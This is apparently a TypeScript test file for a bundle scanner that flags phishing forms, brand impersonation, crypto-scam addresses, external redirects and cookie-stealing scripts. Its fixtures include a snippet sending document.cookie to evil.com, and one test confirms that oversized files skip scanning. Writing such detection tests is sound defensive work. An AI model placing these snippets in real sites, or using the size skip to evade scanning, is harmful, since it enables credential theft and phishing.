import { describe, test, expect } from "vitest";
import { scanBundle } from "./scan.js";

/** Encode a string to base64 */
function b64(str: string): string {
  return Buffer.from(str).toString("base64");
}

describe("scanBundle", () => {
  // --- Clean bundles ---

  test("allows a normal Vite SPA build", () => {
    const result = scanBundle({
      "index.html": b64("<html><head><title>My App</title></head><body><div id='app'></div><script type='module' src='/assets/index-BkH3q2.js'></script></body></html>"),
      "assets/index-BkH3q2.js": b64("console.log('hello')"),
      "assets/index-D4fG8k.css": b64("body { margin: 0 }"),
    });
    expect(result.ok).toBe(true);
  });

  test("allows a single HTML file with benign content", () => {
    const result = scanBundle({
      "index.html": b64("<html><body><h1>Hello World</h1></body></html>"),
    });
    expect(result.ok).toBe(true);
  });

  test("allows assets with no HTML files", () => {
    const result = scanBundle({
      "assets/app-x7kQ9z.js": b64("export default function() {}"),
      "assets/style-mN3pR1.css": b64(".root { display: flex }"),
    });
    expect(result.ok).toBe(true);
  });

  // --- Phishing: credential harvesting ---

  test("blocks login form posting to external URL", () => {
    const result = scanBundle({
      "index.html": b64(`
        <html><body>
          <form action="https://evil.com/steal">
            <input type="email" name="email">
            <input type="password" name="pass">
            <button>Login</button>
          </form>
        </body></html>
      `),
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("content_policy");
    expect(result.detail).toContain("Login form with external action");
  });

  test("blocks password field with email input (credential harvesting)", () => {
    const result = scanBundle({
      "index.html": b64(`
        <html><body>
          <form>
            <input type="email" placeholder="Enter email">
            <input type="password" placeholder="Enter password">
            <button>Sign In</button>
          </form>
        </body></html>
      `),
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("content_policy");
    expect(result.detail).toContain("Credential collection form");
  });

  // --- Phishing: brand impersonation ---

  test("blocks PayPal brand impersonation", () => {
    const result = scanBundle({
      "index.html": b64("<html><head><title>PayPal Account Recovery</title></head><body>Verify your account</body></html>"),
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("content_policy");
    expect(result.detail).toContain("Brand impersonation");
  });

  test("blocks MetaMask impersonation in heading", () => {
    const result = scanBundle({
      "index.html": b64("<html><body><h1>MetaMask Wallet Connect</h1></body></html>"),
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("content_policy");
    expect(result.detail).toContain("Brand impersonation");
  });

  // --- Crypto scam ---

  test("blocks Ethereum addresses in HTML", () => {
    const result = scanBundle({
      "index.html": b64("<html><body>Send ETH to 0x742d35Cc6634C0532925a3b844Bc9e7595f2bD08</body></html>"),
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("content_policy");
    expect(result.detail).toContain("Ethereum address");
  });

  // --- Redirects ---

  test("blocks meta refresh to external site", () => {
    const result = scanBundle({
      "index.html": b64('<html><head><meta http-equiv="refresh" content="0;url=https://phishing.site/fake"></head></html>'),
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("content_policy");
    expect(result.detail).toContain("Meta refresh redirect");
  });

  test("blocks window.location redirect to external site", () => {
    const result = scanBundle({
      "index.html": b64('<html><body><script>window.location.href="https://evil.com"</script></body></html>'),
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("content_policy");
    expect(result.detail).toContain("JavaScript redirect");
  });

  // --- External iframes ---

  test("blocks external iframe to disallowed host", () => {
    const result = scanBundle({
      "index.html": b64('<html><body><iframe src="https://bank-login.fake.com/signin"></iframe></body></html>'),
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("content_policy");
    expect(result.detail).toContain("disallowed host");
  });

  test("allows YouTube embed iframe", () => {
    const result = scanBundle({
      "index.html": b64('<html><body><iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe></body></html>'),
      "style.css": b64("body { color: red }"),
    });
    expect(result.ok).toBe(true);
  });

  test("allows Vimeo player iframe", () => {
    const result = scanBundle({
      "index.html": b64('<html><body><iframe src="https://player.vimeo.com/video/76979871"></iframe></body></html>'),
      "style.css": b64("body {}"),
    });
    expect(result.ok).toBe(true);
  });

  test("allows CodePen embed", () => {
    const result = scanBundle({
      "index.html": b64('<html><body><iframe src="https://codepen.io/team/codepen/embed/PNaGbb"></iframe></body></html>'),
      "style.css": b64("body {}"),
    });
    expect(result.ok).toBe(true);
  });

  test("allows twitter/x embed", () => {
    const result = scanBundle({
      "index.html": b64('<html><body><iframe src="https://platform.twitter.com/embed/tweet.html?id=1234"></iframe></body></html>'),
      "style.css": b64("body {}"),
    });
    expect(result.ok).toBe(true);
  });

  test("allows github gist embed", () => {
    const result = scanBundle({
      "index.html": b64('<html><body><iframe src="https://gist.github.com/user/abc123.pibb"></iframe></body></html>'),
      "style.css": b64("body {}"),
    });
    expect(result.ok).toBe(true);
  });

  test("blocks subdomain spoofing attempts", () => {
    // Attacker tries `youtube.com.evil.com` — must NOT match allowlist
    const result = scanBundle({
      "index.html": b64('<html><body><iframe src="https://youtube.com.evil.com/signin"></iframe></body></html>'),
    });
    expect(result.ok).toBe(false);
    expect(result.detail).toContain("disallowed host");
  });

  // --- Data exfiltration in JS ---

  test("blocks JS that exfiltrates credentials", () => {
    const result = scanBundle({
      "index.html": b64("<html><body></body></html>"),
      "steal.js": b64(`
        const cookies = document.cookie;
        fetch("https://evil.com/collect", { method: "POST", body: cookies });
      `),
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("content_policy");
    expect(result.detail).toContain("Suspicious script");
  });

  test("allows JS with external fetch but no credential access", () => {
    const result = scanBundle({
      "index.html": b64("<html><body></body></html>"),
      "api.js": b64(`
        fetch("https://api.example.com/data").then(r => r.json());
      `),
    });
    expect(result.ok).toBe(true);
  });

  // --- Edge cases ---

  test("allows localhost form actions", () => {
    const result = scanBundle({
      "index.html": b64('<html><body><form action="http://localhost:3000/login"><input type="password"></form></body></html>'),
    });
    // localhost is excluded from external form action check
    // But still has password + email signal — check that external action check is what matters
    expect(result.ok).toBe(true);
  });

  test("rejects empty assets object", () => {
    const result = scanBundle({});
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("validation");
  });

  test("rejects invalid base64 in HTML file", () => {
    const result = scanBundle({
      "index.html": "not-valid-base64!!!",
    });
    expect(result.ok).toBe(false);
    expect(result.reason).toBe("validation");
    expect(result.detail).toContain("Invalid base64");
  });

  test("scans all HTML files, not just index.html", () => {
    const result = scanBundle({
      "index.html": b64("<html><body>Clean</body></html>"),
      "phish/login.html": b64('<html><head><title>Apple ID Recovery</title></head><body>Verify</body></html>'),
    });
    expect(result.ok).toBe(false);
    expect(result.detail).toContain("phish/login.html");
  });

  test("skips scanning large JS files (likely framework bundles)", () => {
    // Generate a large JS file (> 500KB base64 = ~375KB content)
    const largeJs = "x".repeat(600_000);
    const result = scanBundle({
      "index.html": b64("<html><body></body></html>"),
      "assets/vendor-abc123.js": Buffer.from(
        `const cookies = document.cookie; fetch("https://evil.com/collect", { body: cookies });` +
        largeJs,
      ).toString("base64"),
    });
    expect(result.ok).toBe(true); // Large file is skipped
  });
});
